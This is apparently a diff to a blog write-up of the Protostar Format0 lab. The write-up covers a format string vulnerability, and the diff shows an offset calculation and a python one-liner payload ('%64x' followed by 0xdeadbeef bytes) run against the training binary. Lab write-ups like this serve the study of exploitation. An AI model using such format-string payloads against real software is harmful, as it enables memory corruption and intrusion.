@@ -6,6 +6,16 @@ comments: true
 categories:
 ---
 
+[Protostar](https://exploit-exercises.com/protostar/) introduces the following in a friendly way:
+
+> * Network programming
+* Byte order
+* Handling sockets
+* Stack overflows
+* Format strings
+* Heap overflows
+
+
 ##Format0 - format string vulnerability
 
 This post assumes the reader know why a format string vulnerability occurs, if you don't know owasp have
@@ -84,11 +94,12 @@ Offset:```0xbffff35c-0xbffff31c = 0x40 = 64d```
 
 And our payload becomes:
 
-64bytes+0xdeadbeef
+`64bytes+0xdeadbeef`
 
-%64x+0xdeadbeef
+`%64x+0xdeadbeef`
 
-$(python -c 'print "%64x"+"\xef\xbe\xad\xde"')
+`$(python -c 'print "%64x"+"\xef\xbe\xad\xde"')`
+
 
 ```
 tomasuh@crunch:~/programming/pentest/protostar$ ./format0 $(python -c 'print "%64x"+"\xef\xbe\xad\xde"')
